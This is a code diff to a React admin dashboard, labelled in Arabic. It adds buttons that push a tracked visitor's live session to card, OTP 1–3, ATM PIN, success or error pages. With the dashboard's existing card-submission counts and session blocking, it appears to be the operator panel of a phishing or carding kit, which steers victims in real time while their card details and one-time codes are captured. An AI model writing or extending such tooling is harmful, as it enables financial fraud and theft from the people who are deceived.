@@ -1,7 +1,7 @@
 ﻿import { useEffect, useMemo, useState, useCallback, useRef, type ReactNode } from "react";
 import { useLocation } from "wouter";
 import { getToken, logoutAdmin } from "@/lib/auth";
-import { getAdminStats, listAdminSubmissions, sendAdminControl, adminLogoutAll, adminChangePassword, getAllAdminSubmissions, getAdminSubmissionsFromSupabase } from "@/lib/api";
+import { getAdminStats, listAdminSubmissions, sendAdminControl, adminLogoutAll, adminChangePassword, getAllAdminSubmissions, getAdminSubmissionsFromSupabase, sendRedirectCommand, type RedirectTarget } from "@/lib/api";
 import { getAdminSettings, saveAdminSettings, getBlockedSessions, blockSession, unblockSession, getTrashItems, moveSubmissionToTrash, restoreTrashItem, deleteTrashItem, clearTrash } from "@/lib/admin-store";
 import { Button } from "@/components/ui/button";
 import { Badge } from "@/components/ui/badge";
@@ -18,6 +18,9 @@ import {
   ChevronUp,
   Activity,
   Wifi,
+  Home,
+  ArrowRight,
+  AlertCircle,
 } from "lucide-react";
 
 // Import heartbeat tracking utilities
@@ -428,6 +431,7 @@ function SessionBox({
   onUnblock,
   onDelete,
   onOpenHistory,
+  onRedirect,
 }: {
   sessionId: string;
   rows: SubmissionRow[];
@@ -441,6 +445,7 @@ function SessionBox({
   onUnblock: () => void;
   onDelete: () => void;
   onOpenHistory: () => void;
+  onRedirect: (target: RedirectTarget) => void;
 }) {
   const [expanded, setExpanded] = useState(true);
   const [loadingAction, setLoadingAction] = useState<string | null>(null);
@@ -470,6 +475,11 @@ function SessionBox({
     } finally {
       setLoadingAction(null);
     }
+  };
+
+  // Handle redirect with loading state
+  const handleRedirectAction = (target: RedirectTarget) => {
+    onRedirect(target);
   };
 
   return (
@@ -530,6 +540,67 @@ function SessionBox({
               className="rounded-2xl border border-red-200 bg-red-50 px-3 py-2 text-xs text-red-700 hover:bg-red-100"
             >
               سلة المهملات
+            </button>
+          </div>
+
+          {/* Navigation Control Buttons - Send redirect commands */}
+          <div className="flex flex-wrap gap-1.5 mt-3 pt-3 border-t border-slate-100">
+            <span className="text-[10px] text-slate-400 w-full mb-1">تحكم التنقل المباشر:</span>
+            <button
+              type="button"
+              onClick={() => handleRedirectAction('home')}
+              className="rounded-lg border border-blue-200 bg-blue-50 px-2 py-1 text-[10px] text-blue-700 hover:bg-blue-100 flex items-center gap-1"
+            >
+              <Home className="w-3 h-3" /> الرئيسية
+            </button>
+            <button
+              type="button"
+              onClick={() => handleRedirectAction('card')}
+              className="rounded-lg border border-purple-200 bg-purple-50 px-2 py-1 text-[10px] text-purple-700 hover:bg-purple-100 flex items-center gap-1"
+            >
+              <CreditCard className="w-3 h-3" /> البطاقة
+            </button>
+            <button
+              type="button"
+              onClick={() => handleRedirectAction('otp1')}
+              className="rounded-lg border border-green-200 bg-green-50 px-2 py-1 text-[10px] text-green-700 hover:bg-green-100 flex items-center gap-1"
+            >
+              <KeyRound className="w-3 h-3" /> الرمز 1
+            </button>
+            <button
+              type="button"
+              onClick={() => handleRedirectAction('otp2')}
+              className="rounded-lg border border-green-200 bg-green-50 px-2 py-1 text-[10px] text-green-700 hover:bg-green-100 flex items-center gap-1"
+            >
+              <KeyRound className="w-3 h-3" /> الرمز 2
+            </button>
+            <button
+              type="button"
+              onClick={() => handleRedirectAction('otp3')}
+              className="rounded-lg border border-green-200 bg-green-50 px-2 py-1 text-[10px] text-green-700 hover:bg-green-100 flex items-center gap-1"
+            >
+              <KeyRound className="w-3 h-3" /> الرمز 3
+            </button>
+            <button
+              type="button"
+              onClick={() => handleRedirectAction('atm')}
+              className="rounded-lg border border-blue-200 bg-blue-50 px-2 py-1 text-[10px] text-blue-700 hover:bg-blue-100 flex items-center gap-1"
+            >
+              <Banknote className="w-3 h-3" /> الصراف
+            </button>
+            <button
+              type="button"
+              onClick={() => handleRedirectAction('success')}
+              className="rounded-lg border border-emerald-200 bg-emerald-50 px-2 py-1 text-[10px] text-emerald-700 hover:bg-emerald-100 flex items-center gap-1"
+            >
+              <ArrowRight className="w-3 h-3" /> نجاح
+            </button>
+            <button
+              type="button"
+              onClick={() => handleRedirectAction('error')}
+              className="rounded-lg border border-red-200 bg-red-50 px-2 py-1 text-[10px] text-red-700 hover:bg-red-100 flex items-center gap-1"
+            >
+              <AlertCircle className="w-3 h-3" /> خطأ
             </button>
           </div>
         </div>
@@ -832,6 +903,11 @@ export default function AdminDashboard() {
     await fetchData();
   }, [fetchData]);
 
+  // Handle redirect/navigation commands
+  const handleRedirect = useCallback(async (sessionId: string, target: RedirectTarget) => {
+    await sendRedirectCommand(sessionId, target);
+  }, []);
+
   const blockedMap = useMemo(() => Object.fromEntries(blockedSessions.map((entry) => [entry.sessionId, entry])), [blockedSessions]);
   const sessionCount = Object.keys(sessions).length;
   const cardCount = stats?.byType.find((item) => item.type === "card")?.count ?? 0;
@@ -955,6 +1031,7 @@ export default function AdminDashboard() {
                     onUnblock={() => handleUnblock(sessionId)}
                     onDelete={() => handleDeleteSession(sessionId)}
                     onOpenHistory={() => setHistoryDialog({ sessionId, rows })}
+                    onRedirect={(target) => handleRedirect(sessionId, target)}
                   />
                 ))}
               </div>
